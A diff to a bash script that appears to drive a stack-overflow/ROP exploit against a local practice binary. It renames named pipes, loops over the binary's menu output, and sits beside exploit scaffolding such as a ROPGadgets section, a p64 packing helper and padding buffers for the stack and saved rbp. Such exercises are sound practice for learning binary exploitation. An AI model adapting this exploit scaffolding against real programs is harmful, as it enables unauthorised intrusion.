@@ -9,6 +9,12 @@ fi
 if [[ -e payload_3_3 ]]; then
     rm payload_3_3
 fi
+if [[ -e input_pipe_03 ]]; then
+    rm input_pipe_03
+fi
+if [[ -e output_pipe_03 ]]; then
+    rm output_pipe_03
+fi
 
 
 : << ROPGadgets
@@ -64,8 +70,8 @@ p64() {
 }
 
 
-mkfifo /tmp/03_input_pipe
-mkfifo /tmp/03_output_pipe
+mkfifo input_pipe_03
+mkfifo output_pipe_03
 
 safe_stack_buf=$(printf "\x01%0.s" $(seq 1 24))
 
@@ -77,17 +83,18 @@ cover_rbp=$(printf "\x01%0.s" $(seq 1 8))
 
 
 
-./father < /tmp/03_input_pipe > /tmp/03_output_pipe
+# ./test < input_pipe_03 > output_pipe_03 2>&1 &
 
-read line < /tmp/03_output_pipe
-if [[ $line == *"3. stop create child and get out"* ]];then
-    echo -ne "3" > /tmp/03_output_pipe
-fi
+./test < input_pipe_03 | \
+while IFS= read -r line; do
+    echo $line
+    if [[ $line == *"3. stop create child and get out"* ]]; then
+        echo -e "3" > input_pipe_03
+        break
+    fi
+done
 
-read line < /tmp/03_output_pipe
-echo $line
+rm input_pipe_03
+rm output_pipe_03
 
-
-rm /tmp/03_input_pipe
-rm /tmp/03_output_pipe
 
